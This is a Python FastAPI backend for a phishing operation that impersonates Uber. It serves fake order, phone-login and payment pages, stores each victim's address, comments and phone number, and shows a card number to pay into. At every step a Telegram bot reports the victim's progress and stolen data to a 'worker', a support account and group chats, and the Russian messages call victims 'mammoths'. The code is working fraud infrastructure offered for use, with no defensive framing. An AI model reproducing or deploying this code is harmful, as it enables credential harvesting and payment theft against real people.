from fastapi import FastAPI, Form
from sqlalchemy.orm import aliased
from starlette.requests import Request
from starlette.responses import RedirectResponse, HTMLResponse
from starlette.templating import Jinja2Templates
from main_bot.main import bot as main_bot
from main_bot.db_stuff import User, Links, Cards, BASE_DIR
from uber.db_uber import CustomersUber, session

app = FastAPI()
templates = Jinja2Templates(directory=f"{BASE_DIR}/templates")

@app.get("/")
async def root():
    return RedirectResponse(url="https://support-uber.com")

@app.get("/order/{item}", response_class=HTMLResponse)
async def order(request: Request, item: str):
    link = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
    print(link.from_address)
    uber = session.query(CustomersUber).filter(CustomersUber.link.like(f"%{item}%")).first()
    if uber:
        if uber.number_phone_mammoth:
            return RedirectResponse(url=f"{request.url}/pay")
        else:
            return RedirectResponse(url=f"{request.url}/login")
    else:
        if link:
            worker = session.query(User).filter(User.tg_id == link.user_id).first()
            tp = session.query(User.tg_id).filter(User.status == 2).first()
            await main_bot.send_message(
                text=f"Мамонт зашел на главную странциу фиша! \nВоркер: @{worker.username}",
                chat_id=link.user_id)

            try:
                await main_bot.send_message(
                    text=f"Мамонт зашел на главную странциу фиша! \nВоркер: @{worker.username}",
                    chat_id=tp.tg_id)
            except:
                pass

            return templates.TemplateResponse("убер_главная.html", {"request": request, "link": link})

@app.post("/order/{item}", response_class=HTMLResponse)
async def order(item: str, request: Request, address: str = Form(...), textarea: str = Form(default=None)):
    link = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
    user_alias = aliased(User)
    links_alias = aliased(Links)
    worker = (
        session.query(User)
        .filter(User.tg_id == session.query(links_alias.user_id).filter(
            links_alias.link.like(f"%{item}%")).scalar_subquery())
        .first()
    )
    uber = CustomersUber(worker_id=worker.tg_id, to_address=address, comment=textarea, worker_username=worker.username, link=str(request.url))
    session.add(uber)
    session.commit()
    red = RedirectResponse(url=f"{request.url}/login", status_code=302)
    if link:
        worker = session.query(User).filter(User.tg_id == link.user_id).first()
        tp = session.query(User.tg_id).filter(User.status == 2).first()
        await main_bot.send_message(
            text=f"Мамонт сообщил свои данные:\nЕго адрес:{address}\nКоментарйи для водителя который ввел мамонт:{textarea} \nВоркер: @{worker.username}",
            chat_id=link.user_id)

        try:
            await main_bot.send_message(
                text=f"Мамонт сообщил свои данные:\nЕго адрес:{address}\nКоментарйи для водителя который ввел мамонт:{textarea} \nВоркер: @{worker.username}",
                chat_id=tp.tg_id)
        except:
            pass
    return red

@app.get("/order/{item}/login", response_class=HTMLResponse)
async def login(request: Request, item: str):
    uber = session.query(CustomersUber).filter(CustomersUber.link.like(f"%{item}%")).first()
    link = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
    if uber.number_phone_mammoth:
        return RedirectResponse(url=f"{uber.link}/pay")
    else:
        if link:
            worker = session.query(User).filter(User.tg_id == link.user_id).first()
            tp = session.query(User.tg_id).filter(User.status == 2).first()
            await main_bot.send_message(
                text=f"Мамонт на вводе своего номера телефона \nВоркер: @{worker.username}",
                chat_id=link.user_id)

            try:
                await main_bot.send_message(
                    text=f"Мамонт на вводе своего номера телефона \nВоркер: @{worker.username}",
                    chat_id=tp.tg_id)
            except:
                pass
        return templates.TemplateResponse("номер.html", {"request": request})

@app.post("/order/{item}/login", response_class=HTMLResponse)
async def login(request: Request, item: str, phone: str = Form(...)):
    link = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
    uber = session.query(CustomersUber).filter(CustomersUber.link.like(f"%{item}%")).first()
    uber.number_phone_mammoth = phone
    session.add(uber)
    session.commit()
    red = RedirectResponse(url=f"{uber.link}/pay", status_code=302)
    if link:
        worker = session.query(User).filter(User.tg_id == link.user_id).first()
        tp = session.query(User.tg_id).filter(User.status == 2).first()
        await main_bot.send_message(
            text=f"Мамонт ввел свой номер телефона {phone} \nВоркер: @{worker.username}",
            chat_id=link.user_id)

        try:
            await main_bot.send_message(
                text=f"Мамонт ввел свой номер телефона {phone} \nВоркер: @{worker.username}",
                chat_id=tp.tg_id)
        except:
            pass
    return red

@app.get("/order/{item}/pay", response_class=HTMLResponse)
async def pay(request: Request, item: str):
    worker = session.query(User).filter(User.tg_id.startswith(int(item)))
    datas = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
    card = session.query(Cards).filter(Cards.country == 'рус').order_by(Cards.id.desc()).first()
    await main_bot.send_message(
        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
        chat_id=datas.user_id)

    try:
        tp = session.query(User.tg_id).filter(User.status == 2).first()
        await main_bot.send_message(
            text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
            chat_id=tp)
    except:
        pass

    await main_bot.send_message(
        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
        chat_id="-1002063632581")

    await main_bot.send_message(
        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
        chat_id="-1002014887503")

    return templates.TemplateResponse("оплата.html", {"request": request, 'datas': datas, "card": card.numbers})

